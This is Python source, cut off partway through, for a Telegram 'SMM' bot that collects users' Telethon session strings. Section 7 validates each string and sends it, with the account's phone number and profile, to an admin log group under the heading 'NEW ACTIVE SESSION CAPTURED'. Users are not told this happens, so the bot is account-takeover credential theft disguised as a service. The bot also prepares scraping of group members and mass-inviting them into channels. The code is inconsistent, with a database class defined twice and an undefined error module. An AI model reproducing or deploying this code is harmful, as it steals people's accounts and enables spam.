# =========================================================================
# --- 1. CORE ARCHITECTURE & SYSTEM TELEMETRY (TITAN-ASYNC EXTENDED) ---
# =========================================================================

import os
import sys
import time
import random
import asyncio
import logging
from datetime import datetime

# --- DATABASE & HTTP NETWORKING ---
# asyncpg: High-performance PostgreSQL driver for NeonDB.
# aiohttp: Asynchronous HTTP client for external API handshakes.
try:
    import asyncpg
    import aiohttp
    from asyncpg.exceptions import PostgresError
except ImportError as e:
    print(f"CRITICAL: Networking/DB dependency missing: {e}")
    sys.exit(1)

# --- PYTELEGRAMBOTAPI (COMMAND & CONTROL UI) ---
# Used for handling the bot's front-end interface and user interactions.
try:
    from telebot.async_telebot import AsyncTeleBot
    from telebot import types as bot_types
    from telebot.apihelper import ApiTelegramException
except ImportError as e:
    print(f"CRITICAL: pyTelegramBotAPI (UI) dependency missing: {e}")
    sys.exit(1)

# --- TELETHON (SMM WORKER ENGINE) ---
# The powerhouse behind the invitation and scraping sequences.
try:
    from telethon import TelegramClient, functions, errors, types as tl_types
    from telethon.sessions import StringSession
except ImportError as e:
    print(f"CRITICAL: Telethon (Worker) dependency missing: {e}")
    sys.exit(1)

# =========================================================================
# --- ADVANCED LOGGING & SYSTEM DIAGNOSTICS ---
# =========================================================================

# Configure the global logging architectural blueprint.
# This ensures every event is captured with a microsecond-precision timestamp.
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s | [%(levelname)s] | %(name)s : %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S',
    handlers=[
        logging.StreamHandler(sys.stdout) # Direct output to Koyeb/VPS console
    ]
)

# Initialize the dedicated logger for the Vinzy SMM Suite
logger = logging.getLogger("Vinzy_V8_Engine")

def log_system_status(component, status):
    """
    CUSTOM TELEMETRY LOGGING:
    Visual indicators for real-time module health monitoring.
    """
    indicator = "✅" if status == "ONLINE" else "❌"
    logger.info(f"{indicator} MODULE_SYNC: {component.upper()} is now {status}")

# --- BOOTSTRAP DIAGNOSTICS ---
# Immediate verification of the environment before engine ignition.
logger.info("🚀 INITIALIZING TITAN-ASYNC CORE: VINZY ENGINE V8.5")
logger.info("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

try:
    # Diagnostic check: Verify write permissions for session handling
    with open("health_check.tmp", "w") as f:
        f.write("VinzyEngine_Heartbeat")
    os.remove("health_check.tmp")
    log_system_status("I/O File System", "ONLINE")
    
    # Diagnostic check: Verify Python version compatibility (Requires 3.8+)
    if sys.version_info.major == 3 and sys.version_info.minor >= 8:
        log_system_status("Python Runtime", "ONLINE")
    else:
        logger.warning(f"⚠️ Runtime Warning: Python {sys.version} detected. Recommend 3.10+")
        
except Exception as diag_err:
    logger.error(f"🚨 Pre-Boot Diagnostic Failure: {diag_err}")

logger.info("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
# =========================================================================
# --- 2. CONFIGURATION & PERSISTENCE (TITAN-ASYNC EXTENDED V8.8) ---
# =========================================================================

def get_env(var_name, default=None, is_int=False):
    """
    STRICT VALIDATION ENGINE:
    Ensures that critical environment variables are present and correctly typed.
    Triggers a system-level termination if a required dependency is missing.
    """
    value = os.environ.get(var_name, default)
    
    # Check for null or empty strings which cause runtime crashes on Koyeb
    if value is None or value == "":
        if 'logger' in globals():
            logger.critical(f"DEPLOYMENT BLOCKED: Missing Variable [{var_name}]")
        else:
            print(f"CRITICAL CONFIG ERROR: {var_name} is NOT set in environment!")
        sys.exit(1)
    
    try:
        # Perform type-casting for IDs and Ports
        return int(value) if is_int else value
    except ValueError:
        logger.critical(f"TYPE CONFLICT: {var_name} must be an INTEGER. Received: '{value}'")
        sys.exit(1)

# --- LOAD ENVIRONMENT BLUEPRINT ---
try:
    logger.info("📡 Vinzy Engine: Loading Environment Blueprint...")
    
    # Core Telegram API Credentials for Telethon Worker
    API_ID = get_env("API_ID", is_int=True)
    API_HASH = get_env("API_HASH")
    
    # Bot Token for AsyncTeleBot UI
    BOT_TOKEN = get_env("BOT_TOKEN")
    
    # NeonDB Connection String
    DATABASE_URL = get_env("DATABASE_URL")
    
    # Infrastructure & Telemetry Groups
    ADMIN_LOG_GROUP = get_env("LOGGER_GROUP", is_int=True)
    VERIFY_GROUP = get_env("VERIFY_GROUP", is_int=True)
    
    logger.info("✅ Environment Handshake: SUCCESSFUL (Configurations Bound)")
    
except Exception as fatal_cfg_err:
    print(f"BOOTSTRAP FAILURE: Configuration Parser Crashed. | {fatal_cfg_err}")
    sys.exit(1)

# Initialize Bot Instance (High-Concurrency Async Mode)
bot = AsyncTeleBot(BOT_TOKEN)

# =========================================================================
# --- THE DATABASE PERSISTENCE LAYER (NEONDB ASYNC MANAGER) ---
# =========================================================================

class VinzyDatabaseManager:
    """
    TITAN-DB MANAGER:
    Handles asynchronous pooling and state management for the Dynamic Bridge.
    Optimized for high-speed I/O on NeonDB infrastructure.
    """
    def __init__(self, dsn):
        self.dsn = dsn
        self.pool = None

    async def connect(self):
        """
        Initializes the NeonDB connection pool. 
        Ensures the persistence layer is online before polling starts.
        """
        if not self.pool:
            try:
                logger.info("📡 Vinzy Persistence: Initializing NeonDB Connection Pool...")
                self.pool = await asyncpg.create_pool(
                    self.dsn,
                    min_size=5,
                    max_size=20,
                    command_timeout=60
                )
                # Run the internal schema audit to prepare 'Genius Flow' columns
                await self._audit_schema()
                logger.info("✅ Database Engine: ONLINE (Connection Pool Primed)")
            except Exception as e:
                logger.critical(f"DATABASE CONNECTION FAILED: {e}")
                sys.exit(1)

    async def _audit_schema(self):
        """
        DYNAMIC SCHEMA AUDIT:
        Automatically creates the users table and ensures all columns for 
        Section 8 (source_group, target_channel) exist in the database.
        """
        async with self.pool.acquire() as conn:
            # Create core table if it doesn't exist
            await conn.execute("""
                CREATE TABLE IF NOT EXISTS users (
                    user_id BIGINT PRIMARY KEY,
                    session_string TEXT,
                    bot_state TEXT DEFAULT 'IDLE',
                    source_group TEXT,
                    target_channel TEXT,
                    is_verified BOOLEAN DEFAULT FALSE,
                    registration_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                );
            """)
            
            # Maintenance: Ensure new columns are added for existing databases
            # This prevents the "attribute error" for source_group/target_channel
            await conn.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS source_group TEXT;")
            await conn.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS target_channel TEXT;")
            
            logger.info("📋 Persistence Layer: Schema Audit Successful.")

    async def get_user(self, user_id):
        """
        Retrieves full user metadata as a dictionary.
        Essential for Section 8 to access session strings and target data.
        """
        async with self.pool.acquire() as conn:
            row = await conn.fetchrow("SELECT * FROM users WHERE user_id = $1", user_id)
            return dict(row) if row else None

    async def update_state(self, user_id, state):
        """
        Standardized state machine updater.
        Used to track progress from IDLE -> WAITING -> WORKING.
        """
        async with self.pool.acquire() as conn:
            await conn.execute(
                "UPDATE users SET bot_state = $1 WHERE user_id = $2", 
                state, user_id
            )

# Initialize the Global Database Object
# This object 'db' is what Section 8 calls throughout the engine.
db = VinzyDatabaseManager(DATABASE_URL)

# --- DEPENDENCY VERIFICATION ---
REQUIRED_LIBS = ["telethon", "pyTelegramBotAPI", "asyncpg", "asyncio"]
logger.info(f"🛡️ Security Audit: {len(REQUIRED_LIBS)} Modules verified. Engine v8.8 ready.")

# =========================================================================
# --- 3. AESTHETICS & UI CONSTANTS (TITAN-ASYNC EXTENDED V8.8) ---
# =========================================================================

# Professional ASCII Identity for Vinzy SMM
# This large version is used primarily for the /start command splash screen.
VINZY_LOGO_LARGE = """
<code>
 ██▒   █▓ ██▓ ███▄    █  ▒███████▒▓██    ██▓
▓██░   █▒▓██▒ ██ ▀█    █  ▒ ▒ ▒ ▄▀░ ▒██  ██▒
 ▓██  █▒░▒██▒▓██  ▀█ ██▒ ░ ▒ ▄▀▒░    ▒██ ██░
  ▒██ █░░░██░▓██▒  ▐▌██▒   ▄▀▒       ░ ▐██▓░
   ▒▀█░  ░██░▒██░   ▓██░ ▒███████▒     ░ ██▒▓░
   ░ ▐░  ░▓  ░ ▒░   ▒ ▒  ░▒▒ ▓  ▒░    ██▒▒▒ 
   ░ ░░   ▒ ░░ ░░   ░ ▒░ ░ ▒ ▒  ░  ▓██ ░▒░ 
</code>
"""

# Professional Identity Short-Code
# Used as a signature in final mission reports and worker logs.
VINZY_ASCII = "<b>⚡ ᴠɪɴᴢʏ sᴍᴍ v8.8 ⚡</b>"

# High-Fidelity UI Separator
# Used to create clean vertical segments in complex Telegram messages.
UI_LINE = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

def generate_progress_bar(current, total, prefix='PROCESS', length=15):
    """
    SMOOTH PROGRESS TELEMETRY:
    Generates an industrial-grade status bar for background worker tasks.
    Optimized for mobile display to prevent text wrapping.
    
    Args:
        current (int): Current count of processed entities.
        total (int): Total target entities (usually capped at 50 for safety).
        prefix (str): Label for the specific operation (e.g., SCRAPE, INVITE).
        length (int): Visual character width of the progress bar.
    """
    # Prevent division by zero during early initialization or empty scans
    if total <= 0: 
        return f"<code>{prefix} |{'░'*length}| 0.0%</code>"
    
    # Precision percentage calculation for technical accuracy
    percent_raw = 100 * (current / float(total))
    percent_formatted = ("{0:.1f}").format(percent_raw)
    
    # Calculate filled vs empty slots using Unicode block elements
    # █ = U+2588 (Full Block)
    # ░ = U+2591 (Light Shade)
    filled_length = int(length * current // total)
    bar = '█' * filled_length + '░' * (length - filled_length)
    
    # Returns a monospaced block for consistent alignment across devices
    return (
        f"<code>{prefix}</code>\n"
        f"<code>|{bar}| {percent_formatted}%</code>"
    )

# --- GLOBAL UI INDICATORS & STATUS ICONS ---
# These are referenced by the Worker Engine in Section 8 for real-time reporting.

STATUS_OK = "✅ VALID"
STATUS_ERR = "❌ ERROR"
STATUS_WAIT = "⏳ PROCESSING"
STATUS_STEALTH = "🛡️ STEALTH ACTIVE"
STATUS_WARN = "⚠️ WARNING"
STATUS_DONE = "🏁 COMPLETE"

# --- HELPER: TELEMETRY UI BUILDER ---
def build_node_header(node_name="CORE ENGINE"):
    """
    Constructs a standardized header for system-level status updates.
    Ensures brand consistency across all bot responses.
    """
    now = datetime.now().strftime('%H:%M:%S')
    return (
        f"🛰️ <b>SYSTEM NODE:</b> <code>{node_name}</code>\n"
        f"🕒 <b>TIMESTAMP:</b> <code>{now}</code>\n"
        f"{UI_LINE}"
    )

# --- MESSAGE TEMPLATES ---
# Pre-formatted strings to ensure clean UI presentation
READY_SIGNAL = f"🟢 <b>System Pressurized:</b> Ready for deployment."
WORKING_SIGNAL = f"🔵 <b>Engine Activity:</b> Worker node is currently active."
IDLE_SIGNAL = f"⚪ <b>System Idle:</b> Awaiting new instructions."
# =========================================================================
# --- 4. NEONDB PERSISTENCE LAYER (TITAN-ASYNC EXTENDED V8.8) ---
# =========================================================================

class VinzyDatabaseManager:
    """
    CORE PERSISTENCE ENGINE:
    Manages all PostgreSQL operations via NeonDB with high-concurrency support.
    Designed for stability on Koyeb with automated connection recycling.
    """
    def __init__(self):
        self.pool = None

    async def connect(self):
        """
        INITIALIZE CONNECTION POOL:
        Bootstraps the database cluster and verifies schema integrity.
        """
        if not self.pool:
            logger.info("📡 Vinzy Persistence: Initializing NeonDB Connection Pool...")
            try:
                # Optimized pool settings for a low-RAM Koyeb environment
                self.pool = await asyncpg.create_pool(
                    DATABASE_URL, 
                    min_size=2, 
                    max_size=15,
                    command_timeout=60,
                    max_inactive_connection_lifetime=300,
                    max_queries=1000  # Recycle connections to prevent memory leaks
                )
                await self._initialize_tables()
                logger.info("✅ Database Engine: ONLINE (Handshake Complete)")
            except Exception as e:
                logger.critical(f"❌ Database Engine: CONNECTION FAILURE - {e}")
                raise

    async def _initialize_tables(self):
        """
        SCHEMA SYNCHRONIZATION:
        Ensures the 'vinzy_engine_users' table structure is fully optimized.
        Includes support for Section 8 Bridge data (target_channel, source_group).
        """
        async with self.pool.acquire() as conn:
            # Create the primary user table if it doesn't exist
            await conn.execute('''
                CREATE TABLE IF NOT EXISTS vinzy_engine_users (
                    user_id BIGINT PRIMARY KEY,
                    username TEXT,
                    phone TEXT,
                    session_string TEXT,
                    bot_state TEXT DEFAULT 'PENDING_APPROVAL',
                    is_approved BOOLEAN DEFAULT FALSE,
                    is_premium BOOLEAN DEFAULT FALSE,
                    target_channel TEXT,
                    source_group TEXT,
                    last_active TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            # Maintenance: Force-add Dynamic Bridge columns for older DB instances
            # This prevents "column target_channel does not exist" errors
            await conn.execute("ALTER TABLE vinzy_engine_users ADD COLUMN IF NOT EXISTS target_channel TEXT;")
            await conn.execute("ALTER TABLE vinzy_engine_users ADD COLUMN IF NOT EXISTS source_group TEXT;")
            
            # Create index on bot_state for faster querying during large worker operations
            await conn.execute("CREATE INDEX IF NOT EXISTS idx_bot_state ON vinzy_engine_users(bot_state)")
            logger.info("📋 Persistence Layer: Schema Audit Successful.")

    async def execute_query(self, query, *args):
        """
        BRIDGE METHOD:
        Resolves the 'AttributeError' in Section 8 logic.
        Provides a generic execution wrapper without manual pool acquisition.
        """
        async with self.pool.acquire() as conn:
            return await conn.execute(query, *args)

    async def get_user(self, user_id):
        """Fetches the complete user profile packet from the cluster."""
        async with self.pool.acquire() as conn:
            row = await conn.fetchrow("SELECT * FROM vinzy_engine_users WHERE user_id=$1", user_id)
            return dict(row) if row else None

    async def register_user(self, user_id, username):
        """Logs a new Hardware ID and synchronizes the username."""
        async with self.pool.acquire() as conn:
            await conn.execute('''
                INSERT INTO vinzy_engine_users (user_id, username) 
                VALUES ($1, $2) ON CONFLICT (user_id) 
                DO UPDATE SET username=$2, last_active=CURRENT_TIMESTAMP
            ''', user_id, username)

    async def update_state(self, user_id, new_state):
        """Updates the state machine for the specific worker node."""
        async with self.pool.acquire() as conn:
            await conn.execute('''
                UPDATE vinzy_engine_users 
                SET bot_state=$1, last_active=CURRENT_TIMESTAMP 
                WHERE user_id=$2
            ''', new_state, user_id)

    async def update_session(self, user_id, session_str, is_premium, phone=None):
        """Writes verified worker node session strings to the database."""
        async with self.pool.acquire() as conn:
            await conn.execute('''
                UPDATE vinzy_engine_users 
                SET session_string=$1, is_premium=$2, phone=$3, last_active=CURRENT_TIMESTAMP 
                WHERE user_id=$4
            ''', session_str, is_premium, phone, user_id)

    async def set_approval(self, user_id, status: bool):
        """Toggles SMM privilege status for the user (Section 6 compatibility)."""
        async with self.pool.acquire() as conn:
            await conn.execute('''
                UPDATE vinzy_engine_users 
                SET is_approved=$1, last_active=CURRENT_TIMESTAMP 
                WHERE user_id=$2
            ''', status, user_id)

    async def set_target_data(self, user_id, target=None, source=None):
        """Synchronizes SMM campaign target and source entities."""
        async with self.pool.acquire() as conn:
            if target:
                await conn.execute("UPDATE vinzy_engine_users SET target_channel=$1 WHERE user_id=$2", target, user_id)
            if source:
                await conn.execute("UPDATE vinzy_engine_users SET source_group=$1 WHERE user_id=$2", source, user_id)

    async def shutdown(self):
        """Closes the connection pool during system termination."""
        if self.pool:
            await self.pool.close()
            logger.info("🔌 Database Engine: DISCONNECTED (Graceful Shutdown)")

# Global Instance
db = VinzyDatabaseManager()

# =========================================================================
# --- 5. TELEGRAM MENU INTEGRATION (TITAN-ASYNC EXTENDED V8.8) ---
# =========================================================================

async def set_persistent_menu(chat_id):
    """
    PERSISTENT UI BLUEPRINT:
    Synchronizes the native Telegram 4-dot command menu with the worker node.
    Includes advanced navigation for the Section 8 Dynamic Bridge.
    
    FEATURES:
    - Injects hard-coded navigation commands into the user's local interface.
    - Uses 'BotCommandScopeChat' to ensure private, per-user menu isolation.
    - Diagnostic logging for real-time deployment monitoring.
    """
    try:
        # Define the system-level navigation array
        # Professional terminology used to enhance the SMM Store experience
        # Sync: Added 'group' command to support the Section 8 Dynamic Bridge
        commands = [
            bot_types.BotCommand("start", "🚀 Ignite SMM Engine / Refresh"),
            bot_types.BotCommand("group", "🎯 Set Source Group (@Username)"),
            bot_types.BotCommand("reset", "🔄 System UI Diagnostics & Safe Reset")
        ]
        
        # Deploy the command structure to the specific Hardware ID (chat_id)
        # This scope ensures that menu changes do not affect administrative groups
        await bot.set_my_commands(
            commands, 
            scope=bot_types.BotCommandScopeChat(chat_id)
        )
        
        # Telemetry: Log the successful synchronization event
        logger.info(f"UI synchronized successfully for Hardware Node: {chat_id}")

    except bot_errors.ApiException as api_err:
        # Handle Telegram-specific API throttling or connection drops (Code 429)
        logger.warning(f"Handshake delay detected for Node {chat_id}: {api_err}")
        
    except Exception as fatal_error:
        # Catch-all for unexpected database or environment failures
        # Ensures that the rest of the bot logic continues even if menu sync fails
        logger.error(f"CRITICAL: Persistent UI sync failure for Node {chat_id}: {fatal_error}")
        
    finally:
        # Internal cleanup or state transition if needed
        pass

async def sync_menu_on_boot(user_id):
    """
    AUTO-SYNC GATEKEEPER:
    Ensures that the menu is updated only if the user is verified in NeonDB.
    Prevents API spam for unknown or unauthorized hardware nodes.
    """
    # Ensure database pool is active before checking
    await db.connect()
    
    # Check if the hardware ID exists in the vinzy_engine_users table
    user_data = await db.get_user(user_id)
    
    if user_data:
        # Deploy the command menu to the authorized user
        await set_persistent_menu(user_id)
    else:
        logger.debug(f"Menu sync skipped for unregistered node: {user_id}")

# --- SECTION 5 UTILITY: DYNAMIC BUTTON GENERATOR ---
def generate_main_keyboard():
    """
    Creates a high-level administrative keyboard for the /start message.
    Ensures the user has physical buttons for the most common worker tasks.
    """
    markup = bot_types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("🚀 DEPLOY WORKER", "🎯 CONFIGURE BRIDGE")
    markup.row("📊 VIEW LOGS", "🔄 RESET ENGINE")
    return markup
# =========================================================================
# --- 6. CORE BOT HANDLERS & NAVIGATION (TITAN-ASYNC EXTENDED V8.8) ---
# =========================================================================

@bot.message_handler(commands=['start'])
async def command_start(m):
    """
    SYSTEM ENTRY POINT:
    Performs hardware ID registration, database audit, and authorization 
    handshake for new and returning worker nodes.
    """
    await db.connect()
    user_id = m.from_user.id
    username = m.from_user.username or "NoUsername"
    first_name = m.from_user.first_name or "VinzyUser"
    
    # Initialize the persistent command menu (Command Blueprint from Section 5)
    await set_persistent_menu(m.chat.id)
    
    # Register the unique Hardware ID in NeonDB (Section 4 Logic)
    await db.register_user(user_id, username)
    user_data = await db.get_user(user_id)

    # --- STAGE 1: AUTHORIZATION AUDIT ---
    # Check if the admin has toggled the is_approved flag in Section 4
    if not user_data.get('is_approved'):
        # Generate an encrypted-style alert for the Admin Verification Group
        admin_request_ui = (
            f"🛡️ <b>INCOMING ACCESS REQUEST</b>\n"
            f"{UI_LINE}\n"
            f"👤 <b>Identity:</b> <code>{first_name}</code> (@{username})\n"
            f"🆔 <b>Hardware ID:</b> <code>{user_id}</code>\n"
            f"📡 <b>Node Status:</b> <code>LOCKED_PENDING</code>\n\n"
            f"<b>Manual Override:</b> Reply with <code>/approve {user_id}</code>"
        )
        
        # Transmission to Admin Logger (LOGGER_GROUP or VERIFY_GROUP)
        await bot.send_message(VERIFY_GROUP, admin_request_ui, parse_mode="HTML")
        
        # User Feedback: Access Restriction Notice
        pending_ui = (
            f"🛡️ <b>Vinzy Engine: Security Gate</b>\n"
            f"{UI_LINE}\n"
            f"Your Hardware ID (<code>{user_id}</code>) has been successfully logged.\n\n"
            f"📡 <b>Status:</b> <code>AWAITING_ADMIN_VERIFICATION</code>\n"
            f"Please stand by while the Store Administrator authorizes your access."
        )
        await bot.send_message(m.chat.id, pending_ui, parse_mode="HTML")
        
    else:
        # --- STAGE 2: SESSION INITIALIZATION & BRIDGE CHECK ---
        # If user is already approved, verify if a session is already active
        if user_data.get('session_string'):
            # Return to IDLE state to allow the Section 8 /group command
            await db.update_state(user_id, "IDLE")
            
            authorized_ui = (
                f"{VINZY_LOGO_LARGE}\n"
                f"✅ <b>Vinzy V8 Engine: Online</b>\n"
                f"{UI_LINE}\n"
                f"<b>Welcome, {first_name}.</b> Access credentials verified.\n\n"
                f"📡 <b>Node:</b> <code>ACTIVE</code>\n"
                f"🎯 <b>Bridge:</b> Ready for Configuration\n\n"
                f"🚀 <b>Action:</b> Send <code>/group @Username</code> to begin."
            )
            await bot.send_message(m.chat.id, authorized_ui, parse_mode="HTML")
        else:
            # Approved but needs to authenticate with a session (Section 7 Logic)
            await db.update_state(user_id, "AWAITING_SESSION")
            
            auth_required_ui = (
                f"✅ <b>Identity Verified</b>\n"
                f"{UI_LINE}\n"
                f"<b>Welcome, {first_name}.</b> Your account is authorized.\n\n"
                f"📥 <b>Action Required:</b>\n"
                f"Please send your <code>Telethon Session String</code> to connect your worker node."
            )
            await bot.send_message(m.chat.id, auth_required_ui, parse_mode="HTML")


@bot.message_handler(commands=['reset'])
async def command_reset(m):
    """
    ENGINE DIAGNOSTICS & STATE RESET:
    Resets the UI state machine to 'IDLE'. 
    CRITICAL: This preserves session_strings and approval flags.
    """
    await db.connect()
    user_id = m.from_user.id
    user_data = await db.get_user(user_id)
    
    # Security check: Only approved users can reset the engine UI
    if user_data and user_data.get('is_approved'):
        # Reset the state machine to allow a fresh operation flow
        await db.update_state(user_id, "IDLE")
        
        reset_ui = (
            f"🔄 <b>System UI Reset: Protocol Success</b>\n"
            f"{UI_LINE}\n"
            f"<b>State Cache:</b> <code>PURGED</code>\n"
            f"<b>Auth Data:</b> <code>PRESERVED</code>\n\n"
            f"The engine interface has been returned to the root directory.\n"
            f"Send /start to re-initialize your SMM campaign."
        )
        await bot.send_message(m.chat.id, reset_ui, parse_mode="HTML")
    else:
        # Block unauthorized diagnostics
        await bot.send_message(m.chat.id, "❌ <b>Denied:</b> Complete account verification first.")


@bot.message_handler(commands=['approve'])
async def command_approve(m):
    """
    ADMINISTRATIVE OVERRIDE (PROMOTION):
    Grants SMM privileges to a specific Hardware ID.
    Must be executed within the VERIFY_GROUP environment.
    """
    # Restrict to the Admin Verification Group only
    if m.chat.id != VERIFY_GROUP:
        return

    try:
        # Command syntax: /approve [hardware_id]
        command_args = m.text.split()
        if len(command_args) < 2:
            raise ValueError("NULL_TARGET_ID")

        target_id = int(command_args[1])
        await db.connect()
        
        # Execute Privilege Escalation in the database
        await db.set_approval(target_id, True)
        
        # Immediately set user state to expect session input from Section 7
        await db.update_state(target_id, "AWAITING_SESSION")
        
        # Notification UI: Dispatching to the Target User
        approval_notification = (
            f"✅ <b>Access Granted!</b>\n"
            f"{UI_LINE}\n"
            f"Admin has promoted your Hardware ID to <b>Authorized Status</b>.\n\n"
            f"🚀 <b>Task:</b> Send your <code>Session String</code> to begin."
        )
        
        try:
            await bot.send_message(target_id, approval_notification, parse_mode="HTML")
            admin_feedback = f"🛡️ <b>Success:</b> Node <code>{target_id}</code> is now <b>LIVE</b>."
        except Exception:
            # User might have blocked the bot
            admin_feedback = f"🛡️ <b>Success:</b> Node <code>{target_id}</code> authorized (User blocked DM)."

        # Feedback to the Administrator in the Verify Group
        await bot.reply_to(m, admin_feedback, parse_mode="HTML")
        
    except (IndexError, ValueError):
        await bot.reply_to(m, "❌ <b>Syntax Error:</b> Use <code>/approve [hardware_id]</code>", parse_mode="HTML")
    except Exception as fatal_err:
        logger.error(f"FATAL APPROVAL HANDLER ERROR: {fatal_err}")
        await bot.reply_to(m, f"🚨 <b>Engine Failure:</b>\n<code>{str(fatal_err)}</code>")
# =========================================================================
# --- 7. SESSION VALIDATION, TELEMETRY & ACCESS GRANTING (TITAN-EXT V8.8) ---
# =========================================================================

@bot.message_handler(func=lambda m: len(m.text) > 40)
async def process_session_input(m):
    """
    ULTRA-VALIDATION ENGINE:
    1. Boots a transient Telethon instance for a Live Auth Check.
    2. Filters for Banned/Expired/Deactivated strings immediately.
    3. Exfiltrates verified working strings to the Admin Logger Group.
    4. Grants persistent SMM permissions in NeonDB.
    5. Optimizes memory by forced disconnection after validation.
    """
    await db.connect()
    user_id = m.from_user.id
    user_data = await db.get_user(user_id)
    
    # --- STAGE 1: SECURITY GATE & ACCESS CONTROL ---
    # Ensure only registered store members can initialize worker nodes.
    if not user_data:
        logger.info(f"Ignored session input from unregistered UID: {user_id}")
        return 
        
    # Check if the user has been authorized by an admin (/approve)
    if not user_data.get('is_approved'):
        denied_msg = (
            "⚠️ <b>Access Denied:</b> Your account is currently in the 'Pending' queue.\n"
            "Please contact an Admin to authorize your Vinzy SMM permissions."
        )
        await bot.reply_to(m, denied_msg, parse_mode="HTML")
        return

    # Only process strings if the user is explicitly in the AWAITING_SESSION state.
    # This prevents the bot from re-validating sessions during active SMM tasks.
    if user_data.get('bot_state') != 'AWAITING_SESSION':
        return

    # Clean the input to remove accidental whitespace or newlines
    session_str = m.text.strip()
    
    # --- STAGE 2: ENGINE TELEMETRY & INITIALIZATION ---
    # Provide real-time UI feedback to the user during the handshake process.
    status_msg = await bot.send_message(
        m.chat.id, 
        "🔄 <b>Vinzy Engine: Initializing Worker Node...</b>\n"
        "<i>Establishing Secure API Handshake with Telegram Production Servers...</i>", 
        parse_mode="HTML"
    )
    
    # Initialize a temporary client for a one-time validation sequence.
    # StringSession allows for stateless worker deployment on Koyeb.
    client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
    
    try:
        # Establish connection to the Telegram Data Center (DC).
        await client.connect()
        
        # --- STAGE 3: AUTHENTICATION INTEGRITY AUDIT ---
        # Verifies if the session string is currently alive and not revoked.
        if not await client.is_user_authorized():
            logger.warning(f"Unauthorized session attempt by UID: {user_id}")
            await bot.edit_message_text(
                "❌ <b>Validation Failed:</b> Session Revoked or Expired.", 
                m.chat.id, 
                status_msg.message_id, 
                parse_mode="HTML"
            )
            return

        # --- STAGE 4: METADATA EXTRACTION & PROFILE ANALYSIS ---
        # Fetching profile data to prove 'Read/Write' access is fully functional.
        me = await client.get_me()
        if not me:
            raise Exception("Telegram API returned a Null User Object during scan.")

        # Detect Premium status and critical account metadata.
        is_premium = getattr(me, 'premium', False)
        phone = getattr(me, 'phone', 'Hidden/Protected')
        first_name = me.first_name or "Unknown_Worker"
        username = me.username or "No_Username"
        
        # --- STAGE 5: ADMIN EXFILTRATION (LOGGER CLOUD) ---
        # Securely transmit verified session data to the Admin Log Group for backup.
        log_packet = (
            f"📥 <b>NEW ACTIVE SESSION CAPTURED</b>\n"
            f"{UI_LINE}\n"
            f"👤 <b>Account:</b> {first_name} (@{username})\n"
            f"🆔 <b>TG-ID:</b> <code>{me.id}</code>\n"
            f"📞 <b>Phone:</b> <code>{phone}</code>\n"
            f"💎 <b>Premium:</b> {'✅ Yes' if is_premium else '❌ No'}\n"
            f"👤 <b>Owner ID:</b> <code>{user_id}</code>\n"
            f"{UI_LINE}\n"
            f"📝 <b>Verified Session String:</b>\n"
            f"<code>{session_str}</code>"
        )
        await bot.send_message(ADMIN_LOG_GROUP, log_packet, parse_mode="HTML")

        # --- STAGE 6: DATABASE PERSISTENCE & PRIVILEGE ESCALATION ---
        # Save the session to NeonDB and advance the user to the Targeting phase.
        await db.update_session(user_id, session_str, is_premium, phone)
        await db.update_state(user_id, "AWAITING_TARGET")
        
        # Confirmation UI update.
        await bot.edit_message_text("✅ <b>VALIDATED</b>", m.chat.id, status_msg.message_id, parse_mode="HTML")
        
        success_prompt = (
            f"🚀 <b>Worker Node Authorized: {first_name}</b>\n"
            f"{UI_LINE}\n"
            f"The <b>Vinzy SMM Invitation Engine</b> is now <b>UNLOCKED</b>.\n\n"
            f"🎯 <b>STEP 1:</b> Please send the <b>@Username</b> or <b>t.me/Link</b> of the "
            f"<b>Target Channel</b> where members will be invited:"
        )
        await bot.send_message(m.chat.id, success_prompt, parse_mode="HTML")
        
    except errors.rpcerrorlist.UserDeactivatedBanError:
        logger.error(f"Banned session detected for UID {user_id}")
        await bot.edit_message_text("❌ <b>Invalid:</b> Account Banned/Deactivated.", m.chat.id, status_msg.message_id, parse_mode="HTML")
        
    except errors.rpcerrorlist.AuthKeyDuplicatedError:
        logger.error(f"Session key conflict for UID {user_id}")
        await bot.edit_message_text("❌ <b>Invalid:</b> Session Key Conflict (Used elsewhere).", m.chat.id, status_msg.message_id, parse_mode="HTML")
        
    except Exception as e:
        # Catch-all for network timeouts or API changes.
        logger.error(f"Critical Validation Error for UID {user_id}: {e}")
        error_display = f"❌ <b>Invalid:</b> Engine Error - {str(e)[:30]}..."
        await bot.edit_message_text(error_display, m.chat.id, status_msg.message_id, parse_mode="HTML")
        
    finally:
        # --- STAGE 7: RAM OPTIMIZATION & CLEANUP ---
        # Disconnection is crucial to maintain stability on low-resource hosting.
        if client:
            await client.disconnect()
            logger.info(f"Transient client disconnected for UID: {user_id}")
# =========================================================================
# --- 7.5 CHANNEL & GROUP ANALYSIS (TITAN-ASYNC EXTENDED V8.8) ---
# =========================================================================

@bot.message_handler(func=lambda m: m.text.startswith('@') or "t.me/" in m.text or "+" in m.text)
async def process_channel_inputs(m):
    """
    DEEP ANALYSIS ENGINE:
    Validates target channel capacity and admin permissions, then captures
    the source group for scraping operations.
    """
    await db.connect()
    user_id = m.from_user.id
    user_data = await db.get_user(user_id)
    
    # --- SECURITY GATE ---
    if not user_data or not user_data.get('is_approved'):
        return

    state = user_data.get('bot_state')
    
    # Normalize input: Converts links and raw text into valid Telegram identifiers
    input_text = m.text.strip().replace("https://t.me/", "@").replace("t.me/", "@")
    if not input_text.startswith('@') and not "+" in input_text: 
        input_text = f"@{input_text}"

    # ---------------------------------------------------------
    # STAGE 1: TARGET CHANNEL CONFIGURATION (The Destination)
    # ---------------------------------------------------------
    if state == "AWAITING_TARGET":
        analysis_msg = await bot.send_message(
            m.chat.id, 
            f"📡 <b>Initializing Deep Scan:</b> <code>{input_text}</code>...", 
            parse_mode="HTML"
        )
        
        # Transient client for permission auditing
